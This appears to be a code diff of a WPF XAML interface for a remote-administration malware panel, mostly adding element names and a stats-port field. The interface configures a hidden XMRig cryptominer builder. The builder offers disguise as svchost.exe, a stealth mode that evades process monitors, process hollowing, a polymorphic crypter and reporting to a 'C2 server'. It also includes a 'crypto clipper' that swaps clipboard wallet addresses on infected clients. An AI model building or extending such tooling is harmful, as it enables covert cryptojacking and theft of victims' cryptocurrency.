@@ -1904,14 +1904,14 @@
                                             <DataGridTemplateColumn.CellTemplate>
                                                 <DataTemplate>
                                                     <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                                        <Grid Width="28" Height="20" Margin="0,0,8,0" VerticalAlignment="Center">
+                                                        <Grid Width="24" Height="16" Margin="0,0,8,0" VerticalAlignment="Center">
                                                             <Border Background="{DynamicResource SectionBgBrush}" CornerRadius="2"
                                                                     BorderBrush="{DynamicResource SectionBorderBrush}" BorderThickness="0.5">
                                                                 <TextBlock Text="?" Foreground="{DynamicResource FlagUnknownBrush}" FontSize="9"
                                                                            FontFamily="Segoe UI" FontWeight="SemiBold"
                                                                            HorizontalAlignment="Center" VerticalAlignment="Center"/>
                                                             </Border>
-                                                            <Image Source="{Binding FlagImage}" Width="28" Height="20" Stretch="Fill"
+                                                            <Image Source="{Binding FlagImage}" Width="24" Height="16" Stretch="Fill"
                                                                    RenderOptions.BitmapScalingMode="HighQuality" SnapsToDevicePixels="True"/>
                                                             <Border CornerRadius="2" IsHitTestVisible="False">
                                                                 <Border.Background>
@@ -2311,14 +2311,14 @@
                                         <DataGridTemplateColumn.CellTemplate>
                                             <DataTemplate>
                                                 <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                                    <Grid Width="28" Height="20" Margin="0,0,8,0" VerticalAlignment="Center">
+                                                    <Grid Width="24" Height="16" Margin="0,0,8,0" VerticalAlignment="Center">
                                                         <Border Background="{DynamicResource SectionBgBrush}" CornerRadius="2"
                                                                 BorderBrush="{DynamicResource SectionBorderBrush}" BorderThickness="0.5">
                                                             <TextBlock Text="?" Foreground="{DynamicResource FlagUnknownBrush}" FontSize="9"
                                                                        FontFamily="Segoe UI" FontWeight="SemiBold"
                                                                        HorizontalAlignment="Center" VerticalAlignment="Center"/>
                                                         </Border>
-                                                        <Image Source="{Binding FlagImage}" Width="28" Height="20"
+                                                        <Image Source="{Binding FlagImage}" Width="24" Height="16"
                                                                Stretch="Fill" RenderOptions.BitmapScalingMode="HighQuality"
                                                                SnapsToDevicePixels="True"/>
                                                         <Border CornerRadius="2" IsHitTestVisible="False">
@@ -2768,7 +2768,7 @@
                                                     </ControlTemplate>
                                                 </Button.Template>
                                             </Button>
-                                            <TextBlock Text="XMRIG BINARY" Foreground="#99F59E0B"
+                                            <TextBlock x:Name="MnrLblBinary" Text="XMRIG BINARY" Foreground="#99F59E0B"
                                                        FontSize="9" FontWeight="Bold" FontFamily="Consolas"
                                                        VerticalAlignment="Center"/>
                                         </DockPanel>
@@ -2781,14 +2781,14 @@
                                 <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                         Background="{DynamicResource InputBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
                                     <StackPanel>
-                                        <TextBlock Text="NETWORK" FontSize="9" FontWeight="Bold"
+                                        <TextBlock x:Name="MnrSecNetwork" Text="NETWORK" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
-                                        <TextBlock Text="POOL URL" Style="{StaticResource SFieldLabel}"/>
+                                        <TextBlock x:Name="MnrLblPool" Text="POOL URL" Style="{StaticResource SFieldLabel}"/>
                                         <TextBox x:Name="BldMnrPool" Style="{StaticResource STxt}"
                                                  Text="pool.supportxmr.com:3333" Margin="0,0,0,4"/>
                                         <CheckBox x:Name="BldMnrTls" Content="TLS / SSL" Foreground="{DynamicResource ContentTextBrush}"
                                                   FontFamily="Consolas" FontSize="11" Margin="0,0,0,6"/>
-                                        <TextBlock Text="WALLET ADDRESS" Style="{StaticResource SFieldLabel}"/>
+                                        <TextBlock x:Name="MnrLblWallet" Text="WALLET ADDRESS" Style="{StaticResource SFieldLabel}"/>
                                         <TextBox x:Name="BldMnrWallet" Style="{StaticResource STxt}"
                                                  Text="" Margin="0,0,0,6" ToolTip="Your Monero wallet address"/>
                                         <Grid>
@@ -2798,15 +2798,15 @@
                                                 <ColumnDefinition Width="88"/>
                                             </Grid.ColumnDefinitions>
                                             <StackPanel>
-                                                <TextBlock Text="PASSWORD" Style="{StaticResource SFieldLabel}"/>
+                                                <TextBlock x:Name="MnrLblPass" Text="PASSWORD" Style="{StaticResource SFieldLabel}"/>
                                                 <TextBox x:Name="BldMnrPass" Style="{StaticResource STxt}" Text="x"/>
                                             </StackPanel>
                                             <StackPanel Grid.Column="2">
-                                                <TextBlock Text="ALGO" Style="{StaticResource SFieldLabel}"/>
+                                                <TextBlock x:Name="MnrLblAlgo" Text="ALGO" Style="{StaticResource SFieldLabel}"/>
                                                 <TextBox x:Name="BldMnrAlgo" Style="{StaticResource STxt}" Text="rx/0"/>
                                             </StackPanel>
                                         </Grid>
-                                        <TextBlock Text="WORKER NAME (optional)" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
+                                        <TextBlock x:Name="MnrLblWorker" Text="WORKER NAME (optional)" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
                                                    ToolTip="Worker label shown in pool stats. Leave blank to use Password field."/>
                                         <TextBox x:Name="BldMnrWorkerName" Style="{StaticResource STxt}" Text=""
                                                  ToolTip="e.g. rig1 ? overrides Password field as the pool worker name"/>
@@ -2817,7 +2817,7 @@
                                 <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                         Background="{DynamicResource InputBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
                                     <StackPanel>
-                                        <TextBlock Text="CPU TUNING" FontSize="9" FontWeight="Bold"
+                                        <TextBlock x:Name="MnrSecCpu" Text="CPU TUNING" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                         <Grid Margin="0,0,0,6">
                                             <Grid.ColumnDefinitions>
@@ -2826,18 +2826,18 @@
                                                 <ColumnDefinition Width="*"/>
                                             </Grid.ColumnDefinitions>
                                             <StackPanel>
-                                                <TextBlock Text="CPU% IDLE" Style="{StaticResource SFieldLabel}"/>
+                                                <TextBlock x:Name="MnrLblCpuIdle" Text="CPU% IDLE" Style="{StaticResource SFieldLabel}"/>
                                                 <TextBox x:Name="BldMnrCpuIdle" Style="{StaticResource STxt}" Text="75"
                                                          ToolTip="CPU % when user is idle"/>
                                             </StackPanel>
                                             <StackPanel Grid.Column="2">
-                                                <TextBlock Text="CPU% ACTIVE" Style="{StaticResource SFieldLabel}"/>
+                                                <TextBlock x:Name="MnrLblCpuActive" Text="CPU% ACTIVE" Style="{StaticResource SFieldLabel}"/>
                                                 <TextBox x:Name="BldMnrCpuActive" Style="{StaticResource STxt}" Text="0"
                                                          ToolTip="0 = no cap when user is active"/>
                                             </StackPanel>
                                         </Grid>
                                         <StackPanel>
-                                            <TextBlock Text="IDLE AFTER (sec)" Style="{StaticResource SFieldLabel}"/>
+                                            <TextBlock x:Name="MnrLblIdleSec" Text="IDLE AFTER (sec)" Style="{StaticResource SFieldLabel}"/>
                                             <TextBox x:Name="BldMnrIdleSec" Style="{StaticResource STxt}" Text="30"/>
                                         </StackPanel>
                                     </StackPanel>
@@ -2849,17 +2849,21 @@
                                 <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                         Background="{DynamicResource InputBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
                                     <StackPanel>
-                                        <TextBlock Text="DEPLOY" FontSize="9" FontWeight="Bold"
+                                        <TextBlock x:Name="MnrSecDeploy" Text="DEPLOY" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
-                                        <TextBlock Text="INSTALL NAME" Style="{StaticResource SFieldLabel}"/>
+                                        <TextBlock x:Name="MnrLblInstall" Text="INSTALL NAME" Style="{StaticResource SFieldLabel}"/>
                                         <TextBox x:Name="BldMnrInstallName" Style="{StaticResource STxt}"
                                                  Text="svchost.exe" Margin="0,0,0,6"
                                                  ToolTip="Filename used when xmrig is written to AppData"/>
                                         <CheckBox x:Name="BldMnrStealth" Content="Stealth process (taskmgr, procexp, sysinformer, process hacker)"
                                                   Style="{StaticResource SChk}" IsChecked="True"
                                                   ToolTip="Pause/kill miner when a process monitor is detected"/>
+                                        <!-- Stats port field -->
+                                        <TextBlock x:Name="MnrLblStatsPort" Text="STATS PORT" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"/>
+                                        <TextBox x:Name="TxtMnrStatsPort" Style="{StaticResource STxt}" Text="8081" Margin="0,0,0,4"
+                                                 ToolTip="HTTP port for miner stats reporting — must be open/forwarded to this machine"/>
                                         <!-- Integrated stats endpoint info -->
-                                        <TextBlock x:Name="BldMnrStatsInfo" Margin="0,6,0,0" FontSize="10"
+                                        <TextBlock x:Name="BldMnrStatsInfo" Margin="0,2,0,0" FontSize="10"
                                                    Foreground="#60A0FF" FontFamily="Consolas" TextWrapping="Wrap"
                                                    Text="Stats are collected automatically by the C2 server.&#10;Click MINER STATS in the dashboard to view."/>
                                     </StackPanel>
@@ -2869,7 +2873,7 @@
                                 <Border Margin="0,0,0,14" Padding="8,6" CornerRadius="6"
                                         Background="{DynamicResource InputBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
                                     <StackPanel>
-                                        <TextBlock Text="PROTECTION" FontSize="9" FontWeight="Bold"
+                                        <TextBlock x:Name="MnrSecProtection" Text="PROTECTION" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                         <CheckBox x:Name="BldMnrDisableSleep" Content="Disable sleep (keep system awake)"
                                                   Style="{StaticResource SChk}" IsChecked="True"/>
@@ -2887,7 +2891,7 @@
                                                   Style="{StaticResource SChk}" IsChecked="False"/>
                                         <StackPanel Margin="0,2,0,6"
                                                     Visibility="{Binding IsChecked, ElementName=BldMnrHollow, Converter={StaticResource BoolToVis}}">
-                                            <TextBlock Text="HOLLOW TARGET" Style="{StaticResource SFieldLabel}"/>
+                                            <TextBlock x:Name="MnrLblHollowTarget" Text="HOLLOW TARGET" Style="{StaticResource SFieldLabel}"/>
                                             <TextBox x:Name="BldMnrHollowTarget" Style="{StaticResource STxt}" Text="svchost.exe"/>
                                         </StackPanel>
                                         <CheckBox x:Name="BldMnrEncrypt" Content="Crypter (AES-256, loader, polymorphic)"
@@ -2902,14 +2906,14 @@
                                 <Border Padding="8,6" CornerRadius="6"
                                         Background="{DynamicResource InputBgBrush}" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}">
                                     <StackPanel>
-                                        <TextBlock Text="BUILD" FontSize="9" FontWeight="Bold"
+                                        <TextBlock x:Name="MnrSecBuild" Text="BUILD" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                         <StackPanel Orientation="Horizontal">
                                             <Button x:Name="BtnMnrBuild" Content="BUILD" Width="120" Height="30"
                                                     Style="{StaticResource SGreenBtn}" Click="BldMnrBuild_Click"/>
-                                            <Button Content="SAVE CONFIG" Height="30" Margin="8,0,0,0" Padding="12,0"
+                                            <Button x:Name="BtnMnrSaveConfig" Content="SAVE CONFIG" Height="30" Margin="8,0,0,0" Padding="12,0"
                                                     Style="{StaticResource SBtn}" Click="BldMnrSaveConfig_Click"/>
-                                            <Button Content="LOAD CONFIG" Height="30" Margin="6,0,0,0" Padding="12,0"
+                                            <Button x:Name="BtnMnrLoadConfig" Content="LOAD CONFIG" Height="30" Margin="6,0,0,0" Padding="12,0"
                                                     Style="{StaticResource SBtn}" Click="BldMnrLoadConfig_Click"/>
                                         </StackPanel>
                                         <TextBlock x:Name="TxtMnrBuildStatus" Text="" Foreground="{DynamicResource LabelBrush}"
@@ -3119,9 +3123,9 @@
                                             <Image Source="/Resources/crypto/btc.png" Width="28" Height="28"
                                                    Margin="0,0,10,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                             <StackPanel VerticalAlignment="Center">
-                                                <TextBlock Text="CRYPTO CLIPPER" FontSize="10" FontWeight="Bold"
+                                                <TextBlock x:Name="LblClipperTitle" Text="CRYPTO CLIPPER" FontSize="10" FontWeight="Bold"
                                                            FontFamily="Consolas" Foreground="#C8A060"/>
-                                                <TextBlock Text="clipboard address interceptor" FontSize="9"
+                                                <TextBlock x:Name="LblClipperSubtitle" Text="clipboard address interceptor" FontSize="9"
                                                            Foreground="{DynamicResource LabelBrush}" FontFamily="Consolas"/>
                                             </StackPanel>
                                             <Border x:Name="ClipperActiveBadge" Margin="12,0,0,0" CornerRadius="3"
@@ -3131,7 +3135,7 @@
                                                     <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
                                                         <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="6" ShadowDepth="0" Opacity="1"/></Ellipse.Effect>
                                                     </Ellipse>
-                                                    <TextBlock Text="INTERCEPTING" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Consolas"/>
+                                                    <TextBlock x:Name="LblClipperIntercepting" Text="INTERCEPTING" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Consolas"/>
                                                 </StackPanel>
                                             </Border>
                                             <TextBlock x:Name="ClipperCountTxt" Text=""
@@ -3147,7 +3151,7 @@
                                                     Style="{StaticResource SRedBtn}" IsEnabled="False" Opacity="0.4"
                                                     Margin="0,0,6,0" Click="ClipperStop_Click"
                                                     ToolTip="Disable clipper on all connected clients"/>
-                                            <Button Content="💾 Save" Height="30" Padding="12,0"
+                                            <Button x:Name="BtnClipperSave" Content="💾 Save" Height="30" Padding="12,0"
                                                     Style="{StaticResource SBtn}"
                                                     Click="ClipperSave_Click"
                                                     ToolTip="Save addresses to config"/>
@@ -3162,10 +3166,10 @@
                                         <Grid DockPanel.Dock="Top" Margin="12,8,12,6">
                                             <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                                 <TextBlock Text="?" FontSize="7" Foreground="#22C55E" VerticalAlignment="Center" Margin="0,0,6,0"/>
-                                                <TextBlock Text="INTERCEPT LOG" FontSize="9" FontWeight="Bold"
+                                                <TextBlock x:Name="LblClipperIntLog" Text="INTERCEPT LOG" FontSize="9" FontWeight="Bold"
                                                            Foreground="{DynamicResource ContentTextBrush}" FontFamily="Consolas" VerticalAlignment="Center"/>
                                             </StackPanel>
-                                            <Button Content="Clear" Height="22" Padding="10,0" HorizontalAlignment="Right"
+                                            <Button x:Name="BtnClipperClear" Content="Clear" Height="22" Padding="10,0" HorizontalAlignment="Right"
                                                     Style="{StaticResource SBtn}" FontSize="10" Click="ClipperClearLog_Click"/>
                                         </Grid>
                                         <ScrollViewer x:Name="ClipperLogScroll" VerticalScrollBarVisibility="Auto"
@@ -3184,7 +3188,7 @@
                                 <Border CornerRadius="6" Padding="16,14" BorderThickness="1" BorderBrush="{DynamicResource SectionBorderBrush}"
                                         Background="{DynamicResource InputBgBrush}">
                                     <StackPanel>
-                                        <TextBlock Text="DESTINATION ADDRESSES" FontSize="9" FontWeight="Bold"
+                                        <TextBlock x:Name="LblClipperDestAddr" Text="DESTINATION ADDRESSES" FontSize="9" FontWeight="Bold"
                                                    Foreground="{DynamicResource LabelBrush}" FontFamily="Consolas" Margin="0,0,0,12"/>
                                         <!-- BTC -->
                                         <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
